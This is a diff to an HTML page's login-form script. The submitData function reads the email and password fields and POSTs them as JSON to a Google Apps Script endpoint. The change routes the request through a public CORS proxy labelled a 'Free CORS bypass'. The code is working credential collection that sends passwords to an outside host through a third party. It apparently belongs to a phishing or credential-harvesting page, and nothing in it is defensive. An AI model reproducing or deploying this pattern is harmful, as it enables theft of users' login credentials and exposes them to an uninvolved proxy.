@@ -55,24 +55,29 @@
 
   <script>
     function submitData() {
-      const email = document.getElementById("email").value;
-      const password = document.getElementById("password").value;
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
 
-      fetch("https://script.google.com/macros/s/AKfycbwk4szjpaX1iBHdC4DA6JLSpL-a6JlTBuIhCmvJaiPBDFbLH-0YICDXsqMuQzGuD2kRLQ/exec", {
-        method: "POST",
-        body: JSON.stringify({ email, password }),
-        headers: {
-          "Content-Type": "application/json"
-        }
-      })
-      .then(res => res.text())
-      .then(msg => {
-        alert("Login data saved!");
-        document.getElementById("email").value = "";
-        document.getElementById("password").value = "";
-      })
-      .catch(err => alert("Error: " + err));
-    }
+  const proxy = "https://corsproxy.io/?"; // Free CORS bypass
+  const scriptURL = "https://script.google.com/macros/s/AKfycbwk4szjpaX1iBHdC4DA6JLSpL-a6JlTBuIhCmvJaiPBDFbLH-0YICDXsqMuQzGuD2kRLQ/exec";
+
+  fetch(proxy + scriptURL, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ email, password })
+  })
+  .then(res => res.text())
+  .then(msg => {
+    alert("Data Sent: " + msg);
+    document.getElementById("email").value = "";
+    document.getElementById("password").value = "";
+  })
+  .catch(err => {
+    alert("Error: " + err);
+  });
+}
   </script>
 </body>
 </html>
